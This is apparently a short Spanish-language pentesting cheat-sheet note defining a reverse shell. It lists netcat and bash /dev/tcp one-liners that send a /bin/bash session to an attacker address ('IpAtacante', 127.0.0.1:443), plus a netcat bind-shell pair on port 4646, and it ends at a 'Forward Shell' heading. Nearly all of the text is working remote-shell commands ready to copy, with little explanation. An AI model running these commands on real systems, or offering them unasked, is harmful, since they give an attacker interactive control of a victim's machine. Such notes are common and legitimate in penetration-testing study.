**Definición

---
ejecutar una consola interactiva [[Reverse Shell]]
**Sintaxis
nc -e /bin/bash [[IpAtacante]] [[puerto]]
**Ejemplo
nc -e /bin/bash 127.0.0.1 443

**Otra forma
bash -i >& /dev/tcp/127.0.0.1/puerto 0>&1

((se pone en escucha))
nc -nlvp 4646 -e /bin/bash
((habilita la cosnola))
nc ipVíctima 4646


//Forward Shell